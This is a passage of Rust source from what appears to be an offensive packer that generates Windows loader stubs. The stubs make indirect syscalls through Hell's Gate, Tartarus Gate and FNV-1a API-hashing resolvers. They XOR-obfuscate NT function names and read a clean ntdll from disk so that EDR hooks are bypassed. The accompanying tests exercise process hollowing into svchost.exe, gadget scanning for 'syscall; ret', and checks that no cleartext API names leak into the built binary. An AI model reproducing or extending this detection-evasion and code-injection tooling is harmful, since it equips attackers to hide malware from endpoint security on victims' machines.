    /// Returns the in-memory `[start, size)` of ntdll's `.text` section.
    fn text_range(base: usize) -> Option<(usize, usize)> {
        let dos = base as *const u8;
        if unsafe { *dos } != b'M' || unsafe { *dos.add(1) } != b'Z' {
            return None;
        }
        let e_lfanew = pe_u32(base, 0x3C)? as usize;
        // IMAGE_NT_HEADERS: Signature (4) + FileHeader (20) + OptionalHeader.
        // FileHeader.NumberOfSections is at offset 2, SizeOfOptionalHeader at
        // offset 16; the section table follows the optional header.
        let num_sections = pe_u16(base, e_lfanew.checked_add(4 + 2)?)? as usize;
        let opt_size = pe_u16(base, e_lfanew.checked_add(4 + 16)?)? as usize;
        let table = e_lfanew.checked_add(4 + 20)?.checked_add(opt_size as usize)?;
        for i in 0..num_sections {
            let s = table.checked_add(i * 40)?;
            let name = unsafe { std::slice::from_raw_parts((base + s) as *const u8, 8) };
            if &name[..5] == b".text" {
                let virtual_address = pe_u32(base, s + 12)? as usize;
                let virtual_size = pe_u32(base, s + 8)? as usize;
                let raw_size = pe_u32(base, s + 16)? as usize;
                return Some((base + virtual_address, virtual_size.max(raw_size)));
            }
        }
        None
    }

    /// Bounds-checked little-endian u16 read from ntdll's mapped image.
    fn pe_u16(base: usize, off: usize) -> Option<u16> {
        let p = base.checked_add(off)?;
        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 2) };
        Some(u16::from_le_bytes([s[0], s[1]]))
    }

    /// Bounds-checked little-endian u32 read from ntdll's mapped image.
    fn pe_u32(base: usize, off: usize) -> Option<u32> {
        let p = base.checked_add(off)?;
        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 4) };
        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
    }

$RESOLVER_BODY$
"#;

/// Hell's Gate resolver: reads SSNs out of the live ntdll export stubs.
/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` are filled by
/// [`render_indirect`].
const HELLS_GATE_RESOLVER: &str = r#"    /// Hell's Gate: reads each SSN out of the Nt* stub prologue in ntdll.
    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
        let ntdll =
            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
            .map_err(|_| SyscallError::NtdllNotFound)?;

        let mut table = SsnTable {
$SSN_INIT$
        };
$SSN_RESOLVE$

        let gadget = find_gadget(module)?;
        Ok((table, gadget))
    }

    /// Resolves one function and reads its SSN from the stub prologue.
    fn resolve_ssn(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
        let cname = std::ffi::CString::new(name)
            .map_err(|_| SyscallError::FunctionNotFound(name.to_string()))?;
        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
        let Some(address) = address else {
            return Err(SyscallError::FunctionNotFound(name.to_string()));
        };
        let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
        match parse_ssn(prologue) {
            Some(ssn) => Ok(ssn),
            None => Err(SyscallError::PatternMismatch(name.to_string())),
        }
    }
"#;

/// PE-file walk helpers shared by the disk-reading resolvers (Tartarus Gate and
/// API hashing): RVA→file-offset conversion and bounds-checked u16/u32 reads.
/// Injected into the resolver body through `$FILE_PE_HELPERS$`.
const FILE_PE_HELPERS: &str = r#"    /// Converts a PE RVA to a file offset using the section table.
    fn rva_to_offset(file: &[u8], rva: usize) -> Option<usize> {
        let e_lfanew = pe32_at(file, 0x3C)? as usize;
        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
            return None;
        }
        let num_sections = pe16_at(file, e_lfanew + 4 + 2)? as usize;
        let opt_size = pe16_at(file, e_lfanew + 4 + 16)? as usize;
        let table = e_lfanew + 4 + 20 + opt_size as usize;

        let mut first_va: Option<usize> = None;
        for i in 0..num_sections {
            let s = table + i * 40;
            let va = pe32_at(file, s + 12)? as usize;
            let raw_size = pe32_at(file, s + 16)? as usize;
            let raw = pe32_at(file, s + 20)? as usize;
            first_va = Some(first_va.map_or(va, |f| f.min(va)));
            if rva >= va && rva - va < raw_size {
                return Some(raw + (rva - va));
            }
        }
        // RVAs below the first section live in the headers, which map 1:1.
        match first_va {
            Some(first) if rva < first => Some(rva),
            _ => None,
        }
    }

    /// Bounds-checked little-endian u16 read from the clean file image.
    fn pe16_at(file: &[u8], off: usize) -> Option<u16> {
        let s = file.get(off..off.checked_add(2)?)?;
        Some(u16::from_le_bytes([s[0], s[1]]))
    }

    /// Bounds-checked little-endian u32 read from the clean file image.
    fn pe32_at(file: &[u8], off: usize) -> Option<u32> {
        let s = file.get(off..off.checked_add(4)?)?;
        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
    }
"#;

/// Tartarus Gate resolver: reads SSNs from a clean copy of ntdll read from
/// disk. `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$NTDLL_PATH_DEF$` /
/// `$FILE_PE_HELPERS$` are filled by [`render_indirect`].
const TARTARUS_GATE_RESOLVER: &str = r#"    /// Tartarus Gate: reads each SSN from a clean copy of ntdll read from
    /// disk, so EDR hooks in the live export stubs cannot hide the SSN. The
    /// gadget still comes from the live ntdll (its `.text` is not hooked).
    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
        let path = $NTDLL_PATH_DEF$;
        let file = std::fs::read(path).map_err(|_| SyscallError::NtdllNotFound)?;

        let mut table = SsnTable {
$SSN_INIT$
        };
$SSN_RESOLVE$

        let ntdll =
            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
            .map_err(|_| SyscallError::NtdllNotFound)?;
        let gadget = find_gadget(module)?;
        Ok((table, gadget))
    }

    /// Resolves one function and reads its SSN from the clean file image.
    fn resolve_ssn(file: &[u8], name: &str) -> Result<u32, SyscallError> {
        let rva = export_rva(file, name)
            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
        let offset = rva_to_offset(file, rva as usize)
            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
        let Some(end) = offset.checked_add(8) else {
            return Err(SyscallError::FunctionNotFound(name.to_string()));
        };
        let prologue = file
            .get(offset..end)
            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
        match parse_ssn(prologue) {
            Some(ssn) => Ok(ssn),
            None => Err(SyscallError::PatternMismatch(name.to_string())),
        }
    }

    /// Finds a function's RVA in a PE image's export directory. `file` is the
    /// raw bytes of the (clean) ntdll file. Safe slice reads throughout.
    fn export_rva(file: &[u8], name: &str) -> Option<u32> {
        let e_lfanew = pe32_at(file, 0x3C)? as usize;
        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
            return None;
        }
        let opt = e_lfanew + 4 + 20;
        let magic = pe16_at(file, opt)?;
        // The data directory starts at optional-header offset 112 (PE32+) or
        // 96 (PE32); ntdll on x64 is PE32+.
        let dir_off = if magic == 0x20b { opt + 112 } else { opt + 96 };
        let export_va = pe32_at(file, dir_off)? as usize;
        if export_va == 0 {
            return None;
        }
        let ed = rva_to_offset(file, export_va)?;
        let num_names = pe32_at(file, ed + 24)? as usize;
        let addr_functions = pe32_at(file, ed + 28)? as usize;
        let addr_names = pe32_at(file, ed + 32)? as usize;
        let addr_ordinals = pe32_at(file, ed + 36)? as usize;

        for i in 0..num_names {
            let name_rva =
                pe32_at(file, rva_to_offset(file, addr_names.checked_add(i.checked_mul(4)?)?)?)?
                    as usize;
            let name_off = rva_to_offset(file, name_rva)?;
            let rest = file.get(name_off..)?;
            let end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
            if &rest[..end] == name.as_bytes() {
                let ordinal = pe16_at(
                    file,
                    rva_to_offset(file, addr_ordinals.checked_add(i.checked_mul(2)?)?)?,
                )? as usize;
                return pe32_at(
                    file,
                    rva_to_offset(file, addr_functions.checked_add(ordinal.checked_mul(4)?)?)?,
                );
            }
        }
        None
    }

$FILE_PE_HELPERS$
"#;

/// API-hashing resolver: walks a clean copy of ntdll read from disk and matches
/// each required function by a precomputed FNV-1a hash of its name, so neither
/// `GetProcAddress` nor any function-name string is needed. The SSN is read
/// from the clean prologue; the gadget still comes from the live ntdll.
/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$NTDLL_PATH_DEF$` /
/// `$FILE_PE_HELPERS$` are filled by [`render_indirect`].
const API_HASH_RESOLVER: &str = r#"    /// API hashing: resolves each SSN by a precomputed FNV-1a hash of its
    /// name, walking a clean copy of ntdll read from disk. No GetProcAddress
    /// and no function-name strings are involved.
    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
        let path = $NTDLL_PATH_DEF$;
        let file = std::fs::read(path).map_err(|_| SyscallError::NtdllNotFound)?;

        let mut table = SsnTable {
$SSN_INIT$
        };
$SSN_RESOLVE$

        let ntdll =
            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
            .map_err(|_| SyscallError::NtdllNotFound)?;
        let gadget = find_gadget(module)?;
        Ok((table, gadget))
    }

    /// FNV-1a 64-bit hash of a function name. Mirrors the packer's `api_hash`
    /// (`engine::syscalls`); keep the two in sync.
    fn api_hash(name: &[u8]) -> u64 {
        let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
        for &byte in name {
            hash ^= byte as u64;
            hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
        }
        hash
    }

    /// Resolves one function by hash and reads its SSN from the clean file.
    fn resolve_ssn(file: &[u8], hash: u64) -> Result<u32, SyscallError> {
        let rva = export_rva_by_hash(file, hash)
            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
        let offset = rva_to_offset(file, rva as usize)
            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
        let Some(end) = offset.checked_add(8) else {
            return Err(SyscallError::FunctionNotFound(format!("0x{hash:016x}")));
        };
        let prologue = file
            .get(offset..end)
            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
        match parse_ssn(prologue) {
            Some(ssn) => Ok(ssn),
            None => Err(SyscallError::PatternMismatch(format!("0x{hash:016x}"))),
        }
    }

    /// Finds a function's RVA by matching its hashed export name against
    /// `hash`. `file` is the raw bytes of the (clean) ntdll file.
    fn export_rva_by_hash(file: &[u8], hash: u64) -> Option<u32> {
        let e_lfanew = pe32_at(file, 0x3C)? as usize;
        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
            return None;
        }
        let opt = e_lfanew + 4 + 20;
        let magic = pe16_at(file, opt)?;
        // The data directory starts at optional-header offset 112 (PE32+) or
        // 96 (PE32); ntdll on x64 is PE32+.
        let dir_off = if magic == 0x20b { opt + 112 } else { opt + 96 };
        let export_va = pe32_at(file, dir_off)? as usize;
        if export_va == 0 {
            return None;
        }
        let ed = rva_to_offset(file, export_va)?;
        let num_names = pe32_at(file, ed + 24)? as usize;
        let addr_functions = pe32_at(file, ed + 28)? as usize;
        let addr_names = pe32_at(file, ed + 32)? as usize;
        let addr_ordinals = pe32_at(file, ed + 36)? as usize;

        for i in 0..num_names {
            let name_rva =
                pe32_at(file, rva_to_offset(file, addr_names.checked_add(i.checked_mul(4)?)?)?)?
                    as usize;
            let name_off = rva_to_offset(file, name_rva)?;
            let rest = file.get(name_off..)?;
            let end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
            if api_hash(&rest[..end]) == hash {
                let ordinal = pe16_at(
                    file,
                    rva_to_offset(file, addr_ordinals.checked_add(i.checked_mul(2)?)?)?,
                )? as usize;
                return pe32_at(
                    file,
                    rva_to_offset(file, addr_functions.checked_add(ordinal.checked_mul(4)?)?)?,
                );
            }
        }
        None
    }

$FILE_PE_HELPERS$
"#;

/// Renders the `mode: none` body: the prelude plus the direct helpers for the
/// required functions.
fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");
    let unmap_def = strings
        .obfuscate("NtUnmapViewOfSection")
        .render_stub_expr("unmap_func");
    let query_def = strings
        .obfuscate("NtQueryInformationProcess")
        .render_stub_expr("query_info_name");
    let get_context_def = strings
        .obfuscate("NtGetContextThread")
        .render_stub_expr("get_context_name");

    let mut out = String::from(NONE_PRELUDE);
    for f in required {
        out.push_str(f.helper_none);
        out.push('\n');
    }
    out.replace("$NTDLL_DEF$", &ntdll_def)
        .replace("$UNMAP_FUNC_DEF$", &unmap_def)
        .replace("$QUERY_FUNC_DEF$", &query_def)
        .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
}

/// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
/// initializers and the selected resolver's resolution lines) plus the indirect
/// helpers.
fn render_indirect(
    config: &SyscallsConfig,
    required: &[&'static NtFunction],
    strings: &StringsConfig,
) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");

    let mut fields = String::new();
    let mut init = String::new();
    let mut resolve_hg = String::new();
    let mut resolve_tg = String::new();
    let mut resolve_ah = String::new();
    let mut helpers = String::new();

    for f in required {
        fields.push_str(&format!("        {}: u32,\n", f.table_field));
        init.push_str(&format!("            {}: 0,\n", f.table_field));

        // The name is rebuilt at runtime from obfuscated bytes; the variable
        // name (e.g. `alloc_vm_name`) is not sensitive. The API-hashing
        // resolver skips it entirely and embeds a precomputed hash instead.
        let name_var = format!("{}_name", f.table_field);
        let name_def = strings.obfuscate(f.name).render_stub_expr(&name_var);
        resolve_hg.push_str(&format!(
            "        table.{} = resolve_ssn(module, &{})?;\n",
            f.table_field, name_def
        ));
        resolve_tg.push_str(&format!(
            "        table.{} = resolve_ssn(&file, &{})?;\n",
            f.table_field, name_def
        ));
        resolve_ah.push_str(&format!(
            "        table.{} = resolve_ssn(&file, 0x{:016x})?;\n",
            f.table_field,
            api_hash(f.name.as_bytes())
        ));

        helpers.push_str(f.helper_indirect);
        helpers.push('\n');
    }

    let resolver_body = match config.resolver {
        Resolver::HellsGate => HELLS_GATE_RESOLVER
            .replace("$SSN_INIT$", init.trim_end())
            .replace("$SSN_RESOLVE$", resolve_hg.trim_end())
            .replace("$NTDLL_DEF$", &ntdll_def),
        Resolver::TartarusGate => {
            let ntdll_path = strings
                .obfuscate(r"C:\Windows\System32\ntdll.dll")
                .render_stub_expr("ntdll_path");
            TARTARUS_GATE_RESOLVER
                .replace("$SSN_INIT$", init.trim_end())
                .replace("$SSN_RESOLVE$", resolve_tg.trim_end())
                .replace("$NTDLL_DEF$", &ntdll_def)
                .replace("$NTDLL_PATH_DEF$", &ntdll_path)
                .replace("$FILE_PE_HELPERS$", FILE_PE_HELPERS)
        }
        Resolver::ApiHash => {
            let ntdll_path = strings
                .obfuscate(r"C:\Windows\System32\ntdll.dll")
                .render_stub_expr("ntdll_path");
            API_HASH_RESOLVER
                .replace("$SSN_INIT$", init.trim_end())
                .replace("$SSN_RESOLVE$", resolve_ah.trim_end())
                .replace("$NTDLL_DEF$", &ntdll_def)
                .replace("$NTDLL_PATH_DEF$", &ntdll_path)
                .replace("$FILE_PE_HELPERS$", FILE_PE_HELPERS)
        }
    };

    let mut out = INDIRECT_PRELUDE
        .replace("$SSN_FIELDS$", fields.trim_end())
        .replace("$RESOLVER_BODY$", &resolver_body);
    out.push_str(&helpers);
    out
}

/// Extracts the SSN from a Hell's Gate stub prologue.
///
/// Returns `Some(ssn)` when `bytes` starts with the canonical prologue
/// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`), and `None`
/// otherwise (hooked or otherwise altered stub). This mirrors the resolver
/// embedded in the generated stub, so the parsing behavior is unit-tested
/// here instead of on a live ntdll.
#[cfg(test)]
pub fn parse_ssn_prologue(bytes: &[u8]) -> Option<u32> {
    const PROLOGUE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8]; // mov r10, rcx; mov eax, imm32
    if bytes.len() < 8 || bytes[..4] != PROLOGUE {
        return None;
    }
    Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
}

/// Returns the offset of the first `0F 05 C3` (`syscall; ret`) gadget in
/// `bytes`, if any. Mirrors the generated stub's ntdll `.text` scanner, so
/// the gadget-matching behavior is unit-tested here.
#[cfg(test)]
pub fn find_gadget_offset(bytes: &[u8]) -> Option<usize> {
    const GADGET: [u8; 3] = [0x0F, 0x05, 0xC3]; // syscall; ret
    bytes.windows(3).position(|window| window == GADGET)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::techniques::process_hollowing::Params;

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn hollowing_pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::ProcessHollowing {
            params: Params {
                target: r"C:\Windows\System32\svchost.exe".to_string(),
            },
        }]
    }

    fn sleep_pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::SleepObfuscation {
            params: crate::techniques::sleep_obfuscation::Params::default(),
        }]
    }

    fn indirect() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::HellsGate,
        }
    }

    fn tartarus() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::TartarusGate,
        }
    }

    fn api_hash_config() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::ApiHash,
        }
    }

    // --- configuration ---

    #[test]
    fn from_yaml_defaults_to_none_when_absent() {
        let config = SyscallsConfig::from_yaml(None).expect("defaults should be valid");
        assert_eq!(config.mode, SyscallsMode::None);
        assert_eq!(config.resolver, Resolver::HellsGate);
    }

    #[test]
    fn from_yaml_parses_indirect_mode() {
        let yaml = YamlSyscallsConfig {
            mode: "indirect".into(),
            resolver: "hells_gate".into(),
        };
        let config = SyscallsConfig::from_yaml(Some(&yaml)).expect("indirect should be valid");
        assert_eq!(config.mode, SyscallsMode::Indirect);
        assert_eq!(config.resolver, Resolver::HellsGate);
    }

    #[test]
    fn from_yaml_rejects_unknown_mode() {
        let yaml = YamlSyscallsConfig {
            mode: "direct".into(),
            resolver: "hells_gate".into(),
        };
        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("direct should fail");
        assert!(
            err.to_string().contains("build.stub.syscalls.mode"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn from_yaml_parses_tartarus_gate() {
        let yaml = YamlSyscallsConfig {
            mode: "indirect".into(),
            resolver: "tartarus_gate".into(),
        };
        let config = SyscallsConfig::from_yaml(Some(&yaml)).expect("tartarus_gate should be valid");
        assert_eq!(config.mode, SyscallsMode::Indirect);
        assert_eq!(config.resolver, Resolver::TartarusGate);
    }

    #[test]
    fn from_yaml_parses_api_hash() {
        let yaml = YamlSyscallsConfig {
            mode: "indirect".into(),
            resolver: "api_hash".into(),
        };
        let config = SyscallsConfig::from_yaml(Some(&yaml)).expect("api_hash should be valid");
        assert_eq!(config.mode, SyscallsMode::Indirect);
        assert_eq!(config.resolver, Resolver::ApiHash);
    }

    #[test]
    fn from_yaml_rejects_unknown_resolver() {
        let yaml = YamlSyscallsConfig {
            mode: "indirect".into(),
            resolver: "halos_gate".into(),
        };
        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("halos_gate should fail");
        assert!(
            err.to_string().contains("build.stub.syscalls.resolver"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn yaml_block_defaults_to_none_and_hells_gate() {
        let yaml: YamlSyscallsConfig = serde_yml::from_str("mode: indirect\n").expect("parse");
        assert_eq!(yaml.mode, "indirect");
        assert_eq!(yaml.resolver, "hells_gate");
    }

    // --- required functions ---

    #[test]
    fn required_lists_hollowing_functions_in_canonical_order() {
        let required = required(&hollowing_pipeline());
        assert_eq!(
            required,
            vec![
                "NtAllocateVirtualMemory",
                "NtWriteVirtualMemory",
                "NtReadVirtualMemory",
                "NtResumeThread",
                "NtUnmapViewOfSection",
                "NtProtectVirtualMemory",
                "NtSuspendThread",
            ]
        );
    }

    #[test]
    fn required_is_empty_when_no_technique_uses_syscalls() {
        assert!(required(&sleep_pipeline()).is_empty());
        assert!(required(&[]).is_empty());
    }

    #[test]
    fn required_deduplicates_across_the_pipeline() {
        // Two hollowing steps would be invalid config, but the union logic
        // must still deduplicate (defensive).
        let pipeline = hollowing_pipeline();
        let names: BTreeSet<&str> = required(&pipeline).into_iter().collect();
        assert_eq!(names.len(), 7, "no duplicates expected");
    }

    // --- Hell's Gate parsing (unit-tested reference for the stub) ---

    #[test]
    fn resolve_ssn_extracts_the_expected_ssn_from_a_canonical_prologue() {
        // `mov r10, rcx; mov eax, 0x2A`
        let prologue = [0x4C, 0x8B, 0xD1, 0xB8, 0x2A, 0x00, 0x00, 0x00];
        assert_eq!(parse_ssn_prologue(&prologue), Some(42));
    }

    #[test]
    fn resolve_ssn_reports_pattern_mismatch_for_a_hooked_prologue() {
        // A hooked stub (e.g. `jmp` to an EDR trampoline) has no SSN.
        let hooked = [0x48, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(parse_ssn_prologue(&hooked), None);
    }

    #[test]
    fn resolve_ssn_reports_function_not_found_when_the_buffer_is_unreadable() {
        // Mirrors the stub: a failed lookup (GetProcAddress/read) is
        // FunctionNotFound, before any pattern check happens.
        let lookup = |_name: &str| None;
        let read = |_addr: usize| None;
        let err = resolve_ssn_reference(&lookup, &read, "NtResumeThread")
            .expect_err("a missing function must fail");
        assert_eq!(
            err,
            ReferenceError::FunctionNotFound("NtResumeThread".into())
        );
    }

    #[test]
    fn resolve_ssn_reads_the_ssn_through_the_injected_lookup() {
        let lookup = |_name: &str| Some(0x1000);
        let read = |_addr: usize| Some([0x4C, 0x8B, 0xD1, 0xB8, 0x07, 0x00, 0x00, 0x00]);
        let ssn = resolve_ssn_reference(&lookup, &read, "NtWriteVirtualMemory")
            .expect("a canonical prologue should resolve");
        assert_eq!(ssn, 7);
    }

    /// Reference error type for [`resolve_ssn_reference`], mirroring the
    /// stub's `SyscallError::FunctionNotFound` / `PatternMismatch` variants.
    #[derive(Debug, PartialEq, Eq)]
    enum ReferenceError {
        FunctionNotFound(String),
        PatternMismatch(String),
    }

    /// Host-side mirror of the stub's `resolve_ssn`, with the address lookup
    /// and the memory read injected so the resolution logic is testable
    /// without Windows. Keep in sync with the generated stub's resolver.
    fn resolve_ssn_reference(
        lookup: &dyn Fn(&str) -> Option<usize>,
        read: &dyn Fn(usize) -> Option<[u8; 8]>,
        name: &str,
    ) -> std::result::Result<u32, ReferenceError> {
        let address =
            lookup(name).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
        let prologue =
            read(address).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
        parse_ssn_prologue(&prologue)
            .ok_or_else(|| ReferenceError::PatternMismatch(name.to_string()))
    }

    // --- API hashing (unit-tested reference for the stub) ---

    #[test]
    fn api_hash_matches_fnv1a_reference_values() {
        // FNV-1a 64-bit; the empty string returns the offset basis untouched,
        // and the first required NT function is pinned against an independent
        // reference computed outside the crate.
        assert_eq!(api_hash(b""), 0xcbf2_9ce4_8422_2325);
        assert_eq!(api_hash(b"NtAllocateVirtualMemory"), 0x4fe2_32be_2dca_3638);
        assert_eq!(api_hash(b"NtGetContextThread"), 0x60b6_1d0a_f197_a950);
    }

    #[test]
    fn api_hash_is_deterministic() {
        assert_eq!(
            api_hash(b"NtWriteVirtualMemory"),
            api_hash(b"NtWriteVirtualMemory")
        );
        assert_ne!(
            api_hash(b"NtWriteVirtualMemory"),
            api_hash(b"NtReadVirtualMemory")
        );
    }

    // --- gadget search (unit-tested reference for the stub) ---

    #[test]
    fn find_gadget_locates_the_syscall_ret_sequence() {
        let bytes = [0x90, 0x90, 0x0F, 0x05, 0xC3, 0xCC, 0xCC];
        assert_eq!(find_gadget_offset(&bytes), Some(2));
    }

    #[test]
    fn find_gadget_returns_none_when_the_sequence_is_absent() {
        let bytes = [0x0F, 0x05, 0xC2, 0x0F, 0x05, 0x90, 0xC3];
        assert_eq!(find_gadget_offset(&bytes), None);
    }

    #[test]
    fn find_gadget_returns_none_for_short_buffers() {
        assert_eq!(find_gadget_offset(&[]), None);
        assert_eq!(find_gadget_offset(&[0x0F, 0x05]), None);
    }

    // --- rendered block (tests 6 and 7 of the phase spec) ---

    #[test]
    fn indirect_block_obfuscates_the_nt_names() {
        let block = render_block(&indirect(), &hollowing_pipeline(), &xor_config());

        // The names must be reconstructed at runtime, never cleartext outside
        // comments (doc comments never reach the binary; the guardrail strips
        // them the same way).
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext NT names leaked outside comments: {leaked:?}"
        );
        // ... while the obfuscated definitions and the resolver exist.
        assert!(
            block.contains("table.alloc_vm = resolve_ssn"),
            "missing resolution line"
        );
        assert!(block.contains("crate::dec_xor"), "xor strategy not applied");
        assert!(
            block.contains("resolve_ssn(module, &"),
            "no resolution lines"
        );
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn indirect_block_contains_the_trampoline_and_ssn_table() {
        let block = render_block(&indirect(), &hollowing_pipeline(), &xor_config());
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("jmp r11"), "gadget jump missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
        assert!(block.contains("fn init_syscalls"), "init missing");
    }

    #[test]
    fn tartarus_gate_block_reads_ssns_from_a_clean_file_copy() {
        let block = render_block(&tartarus(), &hollowing_pipeline(), &xor_config());

        // The resolver walks a clean copy of ntdll read from disk, not the
        // live module's export stubs.
        assert!(block.contains("std::fs::read"), "clean-copy read missing");
        assert!(block.contains("fn export_rva"), "export walker missing");
        assert!(
            block.contains("resolve_ssn(&file, &"),
            "file-based resolution missing"
        );
        assert!(
            !block.contains("resolve_ssn(module, &"),
            "Hell's Gate resolution must not be emitted for Tartarus Gate"
        );
        // The shared machinery is still present.
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn tartarus_gate_block_obfuscates_the_ntdll_path_and_names() {
        let block = render_block(&tartarus(), &hollowing_pipeline(), &xor_config());
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext names/paths leaked outside comments: {leaked:?}"
        );
    }

    #[test]
    fn api_hash_block_resolves_by_hash_not_name() {
        let block = render_block(&api_hash_config(), &hollowing_pipeline(), &xor_config());

        // The resolver matches exports by a precomputed hash, so no NT name
        // string is emitted at all (not even obfuscated).
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext NT names leaked outside comments: {leaked:?}"
        );
        assert!(block.contains("fn api_hash"), "hash function missing");
        assert!(block.contains("std::fs::read"), "clean-copy read missing");
        assert!(
            block.contains("fn export_rva_by_hash"),
            "hash export walker missing"
        );
        assert!(
            block.contains("resolve_ssn(&file, 0x4fe232be2dca3638)?;"),
            "the NtAllocateVirtualMemory hash constant is missing"
        );
        assert!(
            !block.contains("resolve_ssn(module, &"),
            "Hell's Gate resolution must not be emitted for api_hash"
        );
        assert!(
            !block.contains("resolve_ssn(&file, &"),
            "name-based file resolution must not be emitted for api_hash"
        );
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn none_block_has_no_ssn_resolution() {
        let block = render_block(
            &SyscallsConfig::default(),
            &hollowing_pipeline(),
            &xor_config(),
        );

        assert!(
            !block.contains("resolve_ssn"),
            "no SSN resolution in none mode"
        );
        assert!(!block.contains("global_asm"), "no trampoline in none mode");
        assert!(!block.contains("nt_invoke"), "no syscall in none mode");
        assert!(!block.contains("SsnTable"), "no SSN table in none mode");
        assert!(block.contains("VirtualAllocEx"), "direct call missing");
        assert!(block.contains("WriteProcessMemory"), "direct call missing");
        assert!(block.contains("ReadProcessMemory"), "direct call missing");
        assert!(block.contains("ResumeThread"), "direct call missing");
        assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn none_block_obfuscates_the_dynamic_unmap_names() {
        let block = render_block(
            &SyscallsConfig::default(),
            &hollowing_pipeline(),
            &xor_config(),
        );
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            !leaked
                .iter()
                .any(|l| l == "NtUnmapViewOfSection" || l == "ntdll.dll"),
            "dynamic-resolution names leaked outside comments: {leaked:?}"
        );
    }

    #[test]
    fn empty_pipeline_renders_a_no_op_block() {
        let block = render_block(&indirect(), &sleep_pipeline(), &xor_config());
        assert!(block.contains("fn init_syscalls"), "no-op init missing");
        assert!(
            !block.contains("global_asm"),
            "no machinery without requirements"
        );
        assert!(
            !block.contains("nt_alloc_vm"),
            "no helpers without requirements"
        );

        let none_block = render_block(&SyscallsConfig::default(), &[], &xor_config());
        assert!(none_block.contains("fn init_syscalls"));
